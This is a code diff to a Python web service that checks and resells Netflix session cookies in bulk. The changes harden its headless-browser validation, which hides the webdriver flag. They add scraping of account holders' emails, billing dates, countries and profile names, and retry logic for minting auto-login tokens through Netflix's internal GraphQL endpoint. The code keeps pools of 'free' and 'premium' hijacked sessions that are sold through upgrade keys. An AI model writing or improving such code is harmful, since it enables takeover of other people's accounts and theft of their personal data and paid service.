@@ -97,6 +97,9 @@ class GuideUpdate(BaseModel):
     mobile: str
     tv: str
 
+class UpgradePopupUpdate(BaseModel):
+    message: str
+
 # --- Auth Helpers ---
 async def get_current_user(authorization: str = Header(None)):
     if not authorization or not authorization.startswith("Bearer "):
@@ -338,10 +341,24 @@ async def generate_nftoken(cookies: dict):
     netflix_id = norm.get('NetflixId') or norm.get('netflixid')
     secure_id = norm.get('SecureNetflixId') or norm.get('securenetflixid')
 
-    if not netflix_id or not secure_id:
-        return False, None, f"Missing required cookies (NetflixId, SecureNetflixId)"
+    # For Standard plans, SecureNetflixId may not be issued by Netflix
+    # NetflixId alone should be sufficient to try generation
+    if not netflix_id:
+        logger.warning(f"NFToken: Missing critical cookie - NetflixId not found")
+        return False, None, f"Missing required cookie: NetflixId"
+    
+    if not secure_id:
+        logger.warning(f"NFToken: SecureNetflixId not found (may be normal for Standard plans). Attempting with NetflixId only.")
 
     cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
+    logger.info(f"NFToken: Sending {len(cookies)} cookies: {list(cookies.keys())}")
+    logger.debug(f"Cookie string length: {len(cookie_str)} bytes")
+
+    def _is_permission_denied(errors):
+        return any(
+            isinstance(err, dict) and err.get('extensions', {}).get('errorType') == 'PERMISSION_DENIED'
+            for err in (errors or [])
+        )
 
     payload = {
         "operationName": "CreateAutoLoginToken",
@@ -363,31 +380,83 @@ async def generate_nftoken(cookies: dict):
         'Cookie': cookie_str
     }
 
-    try:
-        async with httpx.AsyncClient(timeout=30.0) as http_client:
-            resp = await http_client.post(
-                'https://android13.prod.ftl.netflix.com/graphql',
-                headers=nft_headers,
-                json=payload
-            )
-            if resp.status_code == 200:
-                data = resp.json()
-                if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
-                    token = data['data']['createAutoLoginToken']
-                    return True, token, None
-                elif 'errors' in data:
-                    return False, None, f"API Error: {json.dumps(data.get('errors', []))}"
+    # Retry logic with exponential backoff
+    max_retries = 3
+    last_error = None
+    for attempt in range(max_retries):
+        try:
+            async with httpx.AsyncClient(timeout=30.0) as http_client:
+                resp = await http_client.post(
+                    'https://android13.prod.ftl.netflix.com/graphql',
+                    headers=nft_headers,
+                    json=payload
+                )
+                if resp.status_code == 200:
+                    data = resp.json()
+                    if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
+                        token = data['data']['createAutoLoginToken']
+                        logger.info(f"NFToken: Generated successfully on attempt {attempt + 1}")
+                        return True, token, None
+                    elif 'errors' in data:
+                        errors = data.get('errors', [])
+                        error_msg = json.dumps(errors) if errors else "Unknown API error"
+                        logger.warning(f"NFToken: API returned errors on attempt {attempt + 1}: {error_msg}")
+                        if _is_permission_denied(errors):
+                            return False, None, "Netflix denied NFToken refresh for this account right now"
+                        last_error = f"API Error: {error_msg}"
+                        # Don't retry on explicit API errors
+                        return False, None, last_error
+                    else:
+                        logger.warning(f"NFToken: Unexpected response structure on attempt {attempt + 1}: {json.dumps(data)[:500]}")
+                        return False, None, "Unexpected response structure"
+                elif resp.status_code in [429, 503, 504]:
+                    # Rate limit or service unavailable - retry
+                    if attempt < max_retries - 1:
+                        wait_time = 2 ** attempt  # Exponential backoff: 1s, 2s, 4s
+                        logger.warning(f"NFToken: HTTP {resp.status_code} on attempt {attempt + 1}, retrying in {wait_time}s")
+                        await asyncio.sleep(wait_time)
+                        continue
+                    else:
+                        last_error = f"HTTP {resp.status_code} after {max_retries} retries"
+                        logger.error(f"NFToken: {last_error}")
+                        return False, None, last_error
                 else:
-                    return False, None, "Unexpected response"
+                    last_error = f"HTTP {resp.status_code}: {resp.text[:200] if resp.text else 'no body'}"
+                    logger.warning(f"NFToken: {last_error}")
+                    return False, None, last_error
+        except asyncio.TimeoutError:
+            if attempt < max_retries - 1:
+                wait_time = 2 ** attempt
+                logger.warning(f"NFToken: Timeout on attempt {attempt + 1}, retrying in {wait_time}s")
+                await asyncio.sleep(wait_time)
+                continue
             else:
-                return False, None, f"HTTP {resp.status_code}"
-    except Exception as e:
-        return False, None, str(e)
+                last_error = f"Timeout after {max_retries} attempts"
+                logger.error(f"NFToken: {last_error}")
+                return False, None, last_error
+        except Exception as e:
+            error_str = str(e)
+            if attempt < max_retries - 1:
+                wait_time = 2 ** attempt
+                logger.warning(f"NFToken: Exception on attempt {attempt + 1}: {error_str}, retrying in {wait_time}s")
+                await asyncio.sleep(wait_time)
+                continue
+            else:
+                last_error = f"Error after {max_retries} attempts: {error_str}"
+                logger.error(f"NFToken: {last_error}")
+                return False, None, last_error
+    
+    return False, None, last_error or "All retry attempts exhausted"
 
 # --- Browser Cookie Enrichment (Playwright) ---
 async def get_browser_data(cookies: dict):
     try:
         from playwright.async_api import async_playwright
+
+        browse_timeout_ms = int(os.getenv("PLAYWRIGHT_BROWSE_TIMEOUT_MS", "18000"))
+        account_timeout_ms = int(os.getenv("PLAYWRIGHT_ACCOUNT_TIMEOUT_MS", "14000"))
+        settle_delay_ms = int(os.getenv("PLAYWRIGHT_SETTLE_DELAY_MS", "350"))
+
         async with async_playwright() as p:
             browser = await p.chromium.launch(
                 headless=True,
@@ -399,32 +468,95 @@ async def get_browser_data(cookies: dict):
                 locale='en-US'
             )
 
-            cookie_list = [{
-                "name": name, "value": value,
-                "domain": ".netflix.com", "path": "/",
-                "secure": True, "sameSite": "None"
-            } for name, value in cookies.items()]
+            # Add cookies with flexible domain handling for different account types
+            cookie_list = []
+            for name, value in cookies.items():
+                cookie_list.append({
+                    "name": name, "value": value,
+                    "domain": ".netflix.com", "path": "/",
+                    "secure": True, "sameSite": "None"
+                })
+                # Also try main domain for critical auth cookies (especially for standard plans)
+                if name.lower() in ['nftoken', 'securenetflixid', 'netflixid', 'netflix_session']:
+                    cookie_list.append({
+                        "name": name, "value": value,
+                        "domain": "netflix.com", "path": "/",
+                        "secure": True, "sameSite": "None"
+                    })
             await context.add_cookies(cookie_list)
 
             page = await context.new_page()
+            page.set_default_navigation_timeout(browse_timeout_ms)
+            page.set_default_timeout(browse_timeout_ms)
+
+            # Drop heavy resources to speed up page readiness while preserving DOM/script data.
+            await page.route(
+                "**/*",
+                lambda route: route.abort()
+                if route.request.resource_type in {"image", "media", "font"}
+                else route.continue_(),
+            )
             await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
 
-            info = {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": []}
+            info = {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": [], "error": None}
 
             try:
-                await page.goto("https://www.netflix.com/browse", timeout=25000)
+                await page.goto("https://www.netflix.com/browse", timeout=browse_timeout_ms)
                 await page.wait_for_load_state("domcontentloaded", timeout=10000)
-                await page.wait_for_timeout(2000)
+                await page.wait_for_timeout(settle_delay_ms)
             except Exception:
                 pass
 
             url = page.url
+            try:
+                browse_html = await page.content()
+            except Exception:
+                browse_html = ""
+
             if '/login' in url or '/LoginHelp' in url:
                 await browser.close()
                 return False, "", {}, info
 
+            # Netflix may return an error page (for example NSES-500) instead of a login redirect.
+            if (
+                '/error' in url.lower()
+                or 'nses-500' in browse_html.lower()
+                or 'a problem has occurred' in browse_html.lower()
+            ):
+                # Recovery flow: open Netflix Home then retry browse.
+                info['error'] = 'Netflix transient error page (NSES-500) on /browse'
+                logger.info("Playwright: NSES/error page detected on /browse, attempting Home recovery")
+                try:
+                    await page.goto("https://www.netflix.com/", timeout=browse_timeout_ms)
+                    await page.wait_for_load_state("domcontentloaded", timeout=10000)
+                    await page.wait_for_timeout(settle_delay_ms)
+
+                    # If error page has an explicit "Netflix Home" button, click it.
+                    try:
+                        home_button = page.locator("text=Netflix Home").first
+                        if await home_button.is_visible(timeout=1500):
+                            await home_button.click()
+                            await page.wait_for_load_state("domcontentloaded", timeout=10000)
+                            await page.wait_for_timeout(settle_delay_ms)
+                    except Exception:
+                        pass
+
+                    await page.goto("https://www.netflix.com/browse", timeout=browse_timeout_ms)
+                    await page.wait_for_load_state("domcontentloaded", timeout=10000)
+                    await page.wait_for_timeout(settle_delay_ms)
+
+                    url = page.url
+                    try:
+                        browse_html = await page.content()
+                    except Exception:
+                        browse_html = ""
+                except Exception as recovery_err:
+                    logger.warning(f"Playwright: Home recovery failed: {recovery_err}")
+
             all_browser_cookies = await context.cookies()
-            netflix_cookies = [c for c in all_browser_cookies if 'netflix' in c.get('domain', '').lower()]
+            # Use ALL cookies from browser context - Netflix API needs them all for authorization
+            # Don't filter by domain since auth cookies may be set anywhere
+            netflix_cookies = [c for c in all_browser_cookies if c.get('domain', '').lower() not in ['localhost', '127.0.0.1', '']]
             browser_cookies_str = '; '.join([f"{c['name']}={c['value']}" for c in netflix_cookies])
             browser_cookies_dict = {c['name']: c['value'] for c in netflix_cookies}
 
@@ -433,9 +565,9 @@ async def get_browser_data(cookies: dict):
                 info['country'] = country_match.group(1).upper()
 
             try:
-                await page.goto("https://www.netflix.com/account/security", timeout=20000)
+                await page.goto("https://www.netflix.com/account/security", timeout=account_timeout_ms)
                 await page.wait_for_load_state("domcontentloaded", timeout=10000)
-                await page.wait_for_timeout(2000)
+                await page.wait_for_timeout(settle_delay_ms)
                 security_html = await page.content()
                 email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', security_html)
                 if email_match:
@@ -444,9 +576,9 @@ async def get_browser_data(cookies: dict):
                 logger.warning(f"Security page error: {e}")
 
             try:
-                await page.goto("https://www.netflix.com/YourAccount", timeout=20000)
+                await page.goto("https://www.netflix.com/YourAccount", timeout=account_timeout_ms)
                 await page.wait_for_load_state("domcontentloaded", timeout=10000)
-                await page.wait_for_timeout(3000)
+                await page.wait_for_timeout(settle_delay_ms)
                 account_html = await page.content()
 
                 ctx_match = re.search(r'reactContext\s*=\s*({.*?});', account_html, re.DOTALL)
@@ -482,9 +614,15 @@ async def get_browser_data(cookies: dict):
                             info['email'] = account_data['emailAddress']
                         if not info['country'] and account_data.get('country'):
                             info['country'] = account_data['country']
-                        info['next_billing'] = plan_data.get('nextBillingDate')
-                        profiles_data = models.get('profiles', {}).get('data', [])
-                        info['profiles'] = [pr.get('firstName', pr.get('profileName', 'Profile')) for pr in profiles_data if isinstance(pr, dict)]
+                        nb = plan_data.get('nextBillingDate')
+                        if nb:
+                            info['next_billing'] = nb
+                        profiles_raw = models.get('profiles', {}).get('data', [])
+                        if isinstance(profiles_raw, dict):
+                            profiles_data = list(profiles_raw.values())
+                        else:
+                            profiles_data = profiles_raw if isinstance(profiles_raw, list) else []
+                        info['profiles'] = [pr.get('firstName', pr.get('profileName', pr.get('name', 'Profile'))) for pr in profiles_data if isinstance(pr, dict)]
                     except Exception as e:
                         logger.warning(f"reactContext parse error: {e}")
 
@@ -541,63 +679,118 @@ async def get_browser_data(cookies: dict):
                     if m:
                         info['email'] = m.group(1)
 
+                # --- Regex fallbacks for member_since, next_billing, country, profiles ---
+                if not info['member_since']:
+                    ms_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', account_html)
+                    if ms_match:
+                        info['member_since'] = format_member_since(ms_match.group(1))
+                    else:
+                        # text like "Member since January 2023" or "Member Since: January 2023"
+                        ms_text = re.search(
+                            r'[Mm]ember\s+[Ss]ince[:\s]+([A-Za-z]+\s+\d{4})',
+                            account_html
+                        )
+                        if ms_text:
+                            info['member_since'] = ms_text.group(1)
+
+                if not info['next_billing']:
+                    nb_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', account_html)
+                    if nb_match:
+                        info['next_billing'] = nb_match.group(1)
+                    else:
+                        nb_match2 = re.search(r'"billingDate"\s*:\s*"([^"]+)"', account_html)
+                        if nb_match2:
+                            info['next_billing'] = nb_match2.group(1)
+
+                if not info['country']:
+                    c_match = re.search(r'"countryOfSignup"\s*:\s*"([A-Z]{2})"', account_html)
+                    if not c_match:
+                        c_match = re.search(r'"currentCountry"\s*:\s*"([A-Z]{2})"', account_html)
+                    if not c_match:
+                        c_match = re.search(r'"country"\s*:\s*"([A-Z]{2})"', account_html)
+                    if c_match:
+                        info['country'] = c_match.group(1)
+
+                if not info['profiles']:
+                    profile_names = re.findall(r'"firstName"\s*:\s*"([^"]+)"', account_html)
+                    if not profile_names:
+                        profile_names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', account_html)
+                    if profile_names:
+                        info['profiles'] = list(dict.fromkeys(profile_names))  # dedup preserving order
+
+                logger.info(
+                    f"After all extractions — plan={info['plan']} country={info['country']} "
+                    f"member_since={info['member_since']} next_billing={info['next_billing']} "
+                    f"profiles={info['profiles']}"
+                )
+
             except Exception as e:
                 logger.warning(f"Account page error: {e}")
 
-            # --- Fetch all profiles from the profiles management page ---
+            # --- Profiles manage page: capture ALL profile names ---
             try:
                 await page.goto("https://www.netflix.com/profiles/manage", timeout=20000)
                 await page.wait_for_load_state("domcontentloaded", timeout=10000)
-                await page.wait_for_timeout(2000)
+                await page.wait_for_timeout(1500)
+                profiles_html = await page.content()
 
-                profiles_from_page = await page.evaluate("""
-                    () => {
-                        try {
-                            const d = window.netflix?.appContext?.state?.models?.profiles?.data;
-                            if (d && d.length > 0)
-                                return d.map(p => p.firstName || p.profileName || '').filter(Boolean);
-                        } catch(e) {}
-                        try {
-                            const d = window.netflix?.reactContext?.models?.profiles?.data;
-                            if (d && d.length > 0)
-                                return d.map(p => p.firstName || p.profileName || '').filter(Boolean);
-                        } catch(e) {}
-                        const els = document.querySelectorAll('[data-uia="profile-name"], .profile-name, .profile-link-name, .choose-profile .profile-name');
-                        if (els.length > 0)
-                            return Array.from(els).map(el => el.textContent.trim()).filter(Boolean);
-                        return null;
-                    }
-                """)
+                # Try reactContext first
+                ctx_match = re.search(r'reactContext\s*=\s*({.*?});', profiles_html, re.DOTALL)
+                if ctx_match:
+                    try:
+                        raw_json = ctx_match.group(1)
+                        raw_json = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw_json)
+                        raw_json = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', raw_json)
+                        ctx = json.loads(raw_json)
+                        pdata_raw = ctx.get('models', {}).get('profiles', {}).get('data', [])
+                        if isinstance(pdata_raw, dict):
+                            pdata = list(pdata_raw.values())
+                        else:
+                            pdata = pdata_raw if isinstance(pdata_raw, list) else []
+                        if pdata:
+                            info['profiles'] = [pr.get('firstName', pr.get('profileName', pr.get('name', 'Profile'))) for pr in pdata if isinstance(pr, dict)]
+                    except Exception:
+                        pass
 
-                if profiles_from_page and len(profiles_from_page) > len(info['profiles']):
-                    info['profiles'] = profiles_from_page
-                    logger.info(f"Profiles from manage page: {info['profiles']}")
+                # Regex fallback on profiles page HTML — always run to catch more profiles
+                pnames = re.findall(r'"firstName"\s*:\s*"([^"]+)"', profiles_html)
+                if not pnames:
+                    pnames = re.findall(r'"profileName"\s*:\s*"([^"]+)"', profiles_html)
+                if not pnames:
+                    pnames = re.findall(r'"name"\s*:\s*"([^"]+)"', profiles_html)
+                if pnames:
+                    merged = list(dict.fromkeys(info['profiles'] + pnames))
+                    if len(merged) > len(info['profiles']):
+                        info['profiles'] = merged
 
+                # DOM fallback
                 if not info['profiles']:
-                    manage_html = await page.content()
-                    ctx_match2 = re.search(r'reactContext\s*=\s*({.*?});', manage_html, re.DOTALL)
-                    if ctx_match2:
-                        try:
-                            raw2 = ctx_match2.group(1)
-                            raw2 = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw2)
-                            raw2 = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', raw2)
-                            ctx2 = json.loads(raw2)
-                            pd2 = ctx2.get('models', {}).get('profiles', {}).get('data', [])
-                            if pd2:
-                                info['profiles'] = [pr.get('firstName', pr.get('profileName', 'Profile')) for pr in pd2 if isinstance(pr, dict)]
-                                logger.info(f"Profiles from manage reactContext: {info['profiles']}")
-                        except Exception as e:
-                            logger.warning(f"Profiles manage reactContext parse error: {e}")
+                    try:
+                        dom_profiles = await page.evaluate("""
+                            () => {
+                                const els = document.querySelectorAll('.profile-name, [data-uia="profile-name"]');
+                                return Array.from(els).map(el => el.textContent.trim()).filter(Boolean);
+                            }
+                        """)
+                        if dom_profiles:
+                            info['profiles'] = dom_profiles
+                    except Exception:
+                        pass
 
+                logger.info(f"Profiles page extraction result: {info['profiles']}")
             except Exception as e:
-                logger.warning(f"Profiles manage page error: {e}")
+                logger.warning(f"Profiles page error: {e}")
 
             await browser.close()
+            if not (info.get('email') or info.get('plan') or info.get('country') or info.get('profiles')):
+                # Do not mark invalid here; some valid sessions hide account details intermittently.
+                info['error'] = info.get('error') or 'Account data unavailable from Netflix pages'
+
             return True, browser_cookies_str, browser_cookies_dict, info
 
     except Exception as e:
         logger.error(f"Browser data extraction failed: {e}")
-        return None, "", {}, {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": []}
+        return None, "", {}, {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": [], "error": None}
 
 # --- Netflix Checker ---
 async def check_netflix_cookie(cookie_text, format_type="auto"):
@@ -630,29 +823,36 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
     }
 
     browser_cookies_dict = {}
+    enable_playwright_checks = os.getenv("ENABLE_PLAYWRIGHT_CHECKS", "1") == "1"
+    httpx_check_timeout_seconds = float(os.getenv("HTTPX_CHECK_TIMEOUT_SECONDS", "12"))
 
-    try:
-        is_logged_in, browser_cookies_str, browser_cookies_dict, info = await get_browser_data(cookies)
-        if is_logged_in:
-            result["status"] = "valid"
-            result["browser_cookies"] = browser_cookies_str
-            result["email"] = info.get("email")
-            result["plan"] = info.get("plan")
-            result["country"] = info.get("country")
-            result["member_since"] = info.get("member_since")
-            result["next_billing"] = info.get("next_billing")
-            result["profiles"] = info.get("profiles", [])
-            logger.info(f"Playwright: VALID | email={info.get('email')} | cookies={len(browser_cookies_dict)} keys")
-        elif is_logged_in is False:
-            logger.info("Playwright: session expired/login redirect")
-    except Exception as e:
-        logger.warning(f"Playwright failed: {e}")
+    if enable_playwright_checks:
+        try:
+            async with _playwright_semaphore:
+                is_logged_in, browser_cookies_str, browser_cookies_dict, info = await get_browser_data(cookies)
+                if is_logged_in:
+                    result["status"] = "valid"
+                    result["browser_cookies"] = browser_cookies_str
+                    result["email"] = info.get("email")
+                    result["plan"] = info.get("plan")
+                    result["country"] = info.get("country")
+                    result["member_since"] = info.get("member_since")
+                    result["next_billing"] = info.get("next_billing")
+                    result["profiles"] = info.get("profiles", [])
+                    logger.info(f"Playwright: VALID | email={info.get('email')} | cookies={len(browser_cookies_dict)} keys")
+                elif is_logged_in is False:
+                    logger.info("Playwright: session expired/login redirect")
+        except Exception as e:
+            logger.warning(f"Playwright failed: {e}")
+    else:
+        logger.info("Playwright checks disabled (ENABLE_PLAYWRIGHT_CHECKS=0), using fast HTTP mode")
 
     nftoken_attempts = []
     if browser_cookies_dict:
         nftoken_attempts.append(("browser", browser_cookies_dict))
     nftoken_attempts.append(("original", cookies))
 
+    logger.info(f"NFToken generation starting - plan: {result.get('plan')}, email: {result.get('email')}, sources available: {len(nftoken_attempts)}")
     for source, nft_cookies in nftoken_attempts:
         try:
             success, nft, nft_err = await generate_nftoken(nft_cookies)
@@ -678,7 +878,7 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
             }
             httpx_cookies = browser_cookies_dict if browser_cookies_dict else cookies
 
-            async with httpx.AsyncClient(follow_redirects=True, timeout=20.0) as http:
+            async with httpx.AsyncClient(follow_redirects=True, timeout=httpx_check_timeout_seconds) as http:
                 if not result["email"]:
                     try:
                         sec_resp = await http.get(
@@ -746,8 +946,12 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
                                             if not result['next_billing']:
                                                 result['next_billing'] = plan_info.get('nextBillingDate')
                                             if not result['profiles']:
-                                                profiles_data = models.get('profiles', {}).get('data', [])
-                                                result['profiles'] = [pr.get('firstName', pr.get('profileName', 'Profile')) for pr in profiles_data if isinstance(pr, dict)]
+                                                profiles_raw2 = models.get('profiles', {}).get('data', [])
+                                                if isinstance(profiles_raw2, dict):
+                                                    profiles_data = list(profiles_raw2.values())
+                                                else:
+                                                    profiles_data = profiles_raw2 if isinstance(profiles_raw2, list) else []
+                                                result['profiles'] = [pr.get('firstName', pr.get('profileName', pr.get('name', 'Profile'))) for pr in profiles_data if isinstance(pr, dict)]
                                         except Exception:
                                             pass
                             if not result['country']:
@@ -931,11 +1135,57 @@ async def get_me(user: dict = Depends(get_current_user)):
     }
 
 # --- Cookie Check Routes ---
-_check_semaphore = asyncio.Semaphore(5)
+COOKIE_CHECK_CONCURRENCY = int(os.getenv("COOKIE_CHECK_CONCURRENCY", "5"))
+_check_semaphore = asyncio.Semaphore(max(1, COOKIE_CHECK_CONCURRENCY))
+COOKIE_CHECK_TIMEOUT_SECONDS = int(os.getenv("COOKIE_CHECK_TIMEOUT_SECONDS", "120"))
+
+# Dedicated semaphore for Playwright to prevent Chrome subprocess resource exhaustion
+# on constrained dynos. Keep this low (2) regardless of overall concurrency.
+PLAYWRIGHT_CONCURRENCY = int(os.getenv("PLAYWRIGHT_CONCURRENCY", "2"))
+_playwright_semaphore = asyncio.Semaphore(max(1, PLAYWRIGHT_CONCURRENCY))
 
 async def check_cookie_with_semaphore(block, format_type, job_id, index, total, user):
     async with _check_semaphore:
-        result = await check_netflix_cookie(block, format_type)
+        try:
+            result = await asyncio.wait_for(
+                check_netflix_cookie(block, format_type),
+                timeout=COOKIE_CHECK_TIMEOUT_SECONDS,
+            )
+        except asyncio.TimeoutError:
+            logger.error(
+                f"Cookie check timeout at index {index + 1}/{total} for job {job_id} "
+                f"after {COOKIE_CHECK_TIMEOUT_SECONDS}s"
+            )
+            result = {
+                "status": "invalid",
+                "email": None,
+                "plan": None,
+                "member_since": None,
+                "country": None,
+                "next_billing": None,
+                "profiles": [],
+                "full_cookie": block[:500],
+                "browser_cookies": "",
+                "nftoken": None,
+                "nftoken_link": None,
+                "error": f"Cookie check timed out after {COOKIE_CHECK_TIMEOUT_SECONDS}s",
+            }
+        except Exception as e:
+            logger.error(f"Cookie check failed at index {index + 1}/{total} for job {job_id}: {e}")
+            result = {
+                "status": "invalid",
+                "email": None,
+                "plan": None,
+                "member_since": None,
+                "country": None,
+                "next_billing": None,
+                "profiles": [],
+                "full_cookie": block[:500],
+                "browser_cookies": "",
+                "nftoken": None,
+                "nftoken_link": None,
+                "error": "Cookie check crashed before completion",
+            }
 
         if result["status"] == "valid":
             is_free_cookie = False
@@ -998,7 +1248,10 @@ async def run_bulk_check(job_id, cookie_blocks, format_type, user):
             check_cookie_with_semaphore(block, format_type, job_id, i, len(cookie_blocks), user)
             for i, block in enumerate(cookie_blocks)
         ]
-        await asyncio.gather(*tasks)
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for item in results:
+            if isinstance(item, Exception):
+                logger.error(f"Bulk task exception in job {job_id}: {item}")
         await db.checks.update_one({"id": job_id}, {"$set": {"status": "done"}})
     except Exception as e:
         logger.error(f"Bulk check error for job {job_id}: {e}")
@@ -1069,13 +1322,28 @@ async def get_check_status(job_id: str, user: dict = Depends(get_current_user)):
     job = await db.checks.find_one({"id": job_id, "user_id": user["id"]}, {"_id": 0})
     if not job:
         raise HTTPException(status_code=404, detail="Job not found")
+
+    total = job.get("total", 0)
+    results = job.get("results", [])
+    checked_count = job.get("checked_count", total)
+    checked_count = max(checked_count, len(results))
+    checked_count = min(checked_count, total) if total else checked_count
+
+    status = job.get("status", "done")
+    if total and checked_count >= total and status != "done":
+        status = "done"
+        await db.checks.update_one(
+            {"id": job_id, "user_id": user["id"]},
+            {"$set": {"status": "done"}}
+        )
+
     return {
-        "id": job["id"], "status": job.get("status", "done"), "total": job["total"],
-        "checked_count": job.get("checked_count", job["total"]),
+        "id": job["id"], "status": status, "total": total,
+        "checked_count": checked_count,
         "valid_count": job.get("valid_count", 0),
         "expired_count": job.get("expired_count", 0),
         "invalid_count": job.get("invalid_count", 0),
-        "results": job.get("results", [])
+        "results": results
     }
 
 # --- History Routes ---
@@ -1151,6 +1419,22 @@ async def set_guide(data: GuideUpdate, user: dict = Depends(require_admin)):
         upsert=True
     )
     return value
+
+@api_router.get("/admin/upgrade-popup-message")
+async def get_upgrade_popup_message(user: dict = Depends(get_current_user)):
+    default_message = "Upgrade to premium to unlock premium cookie access. Contact the master key owner for your upgrade key."
+    setting = await db.settings.find_one({"key": "upgrade_popup_message"}, {"_id": 0})
+    return {"message": setting["value"] if setting and setting.get("value") else default_message}
+
+@api_router.post("/admin/upgrade-popup-message")
+async def set_upgrade_popup_message(data: UpgradePopupUpdate, user: dict = Depends(require_admin)):
+    value = (data.message or "").strip()
+    await db.settings.update_one(
+        {"key": "upgrade_popup_message"},
+        {"$set": {"key": "upgrade_popup_message", "value": value}},
+        upsert=True
+    )
+    return {"message": value}
 
 # --- Admin Key Routes ---
 @api_router.post("/admin/keys")
@@ -1525,9 +1809,9 @@ async def force_refresh_tokens(user: dict = Depends(require_admin)):
             if not cookies_dict:
                 await db.free_cookies.update_one(
                     {"id": fc["id"]},
-                    {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                    {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
                 )
-                dead += 1
+                logger.info(f"NFToken refresh skipped (insufficient cookie data) for {fc['id']}")
                 continue
             success, nft, nft_err = await generate_nftoken(cookies_dict)
             if success and nft:
@@ -1542,11 +1826,18 @@ async def force_refresh_tokens(user: dict = Depends(require_admin)):
                 )
                 refreshed += 1
             else:
+                if nft_err == "Netflix denied NFToken refresh for this account right now":
+                    await db.free_cookies.update_one(
+                        {"id": fc["id"]},
+                        {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                    )
+                    logger.info(f"NFToken refresh blocked by Netflix for {fc['id']}: {nft_err}")
+                    continue
                 await db.free_cookies.update_one(
                     {"id": fc["id"]},
-                    {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                    {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
                 )
-                dead += 1
+                logger.warning(f"NFToken refresh failed but cookie kept alive for {fc['id']}: {nft_err}")
         except Exception:
             pass
     return {"message": f"Refreshed {refreshed} alive, {dead} dead out of {len(free_cookies)}", "refreshed": refreshed, "dead": dead, "total": len(free_cookies)}
@@ -1577,11 +1868,17 @@ async def refresh_single_free_cookie_token(cookie_id: str, user: dict = Depends(
         )
         return {"nftoken": nft, "nftoken_link": f"https://netflix.com/?nftoken={nft}"}
     else:
+        if nft_err == "Netflix denied NFToken refresh for this account right now":
+            await db.free_cookies.update_one(
+                {"id": cookie_id},
+                {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
+            )
+            raise HTTPException(status_code=409, detail=nft_err)
         await db.free_cookies.update_one(
             {"id": cookie_id},
-            {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+            {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
         )
-        raise HTTPException(status_code=400, detail=nft_err or "Failed to generate token â€” cookie may be dead")
+        raise HTTPException(status_code=400, detail=nft_err or "Failed to refresh token right now")
 
 @api_router.get("/cookies/total-count")
 async def get_total_cookie_count(user: dict = Depends(get_current_user)):
@@ -1688,9 +1985,9 @@ async def force_refresh_admin_tokens(user: dict = Depends(require_admin_or_premi
             if not cookies_dict:
                 await db.admin_cookies.update_one(
                     {"id": ac["id"]},
-                    {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                    {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
                 )
-                dead += 1
+                logger.info(f"Admin NFToken refresh skipped (insufficient cookie data) for {ac['id']}")
                 continue
             success, nft, nft_err = await generate_nftoken(cookies_dict)
             if success and nft:
@@ -1705,11 +2002,18 @@ async def force_refresh_admin_tokens(user: dict = Depends(require_admin_or_premi
                 )
                 refreshed += 1
             else:
+                if nft_err == "Netflix denied NFToken refresh for this account right now":
+                    await db.admin_cookies.update_one(
+                        {"id": ac["id"]},
+                        {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                    )
+                    logger.info(f"Admin NFToken refresh blocked by Netflix for {ac['id']}: {nft_err}")
+                    continue
                 await db.admin_cookies.update_one(
                     {"id": ac["id"]},
-                    {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                    {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
                 )
-                dead += 1
+                logger.warning(f"Admin NFToken refresh failed but cookie kept alive for {ac['id']}: {nft_err}")
         except Exception:
             pass
     return {"message": f"Refreshed {refreshed} alive, {dead} dead out of {len(admin_cookies)}", "refreshed": refreshed, "dead": dead, "total": len(admin_cookies)}
@@ -1740,11 +2044,17 @@ async def refresh_single_admin_cookie_token(cookie_id: str, user: dict = Depends
         )
         return {"nftoken": nft, "nftoken_link": f"https://netflix.com/?nftoken={nft}"}
     else:
+        if nft_err == "Netflix denied NFToken refresh for this account right now":
+            await db.admin_cookies.update_one(
+                {"id": cookie_id},
+                {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
+            )
+            raise HTTPException(status_code=409, detail=nft_err)
         await db.admin_cookies.update_one(
             {"id": cookie_id},
-            {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+            {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
         )
-        raise HTTPException(status_code=400, detail=nft_err or "Failed to generate token â€” cookie may be dead")
+        raise HTTPException(status_code=400, detail=nft_err or "Failed to refresh token right now")
 
 # --- Favorites Routes (Premium/Master only) ---
 @api_router.post("/favorites/{cookie_id}")
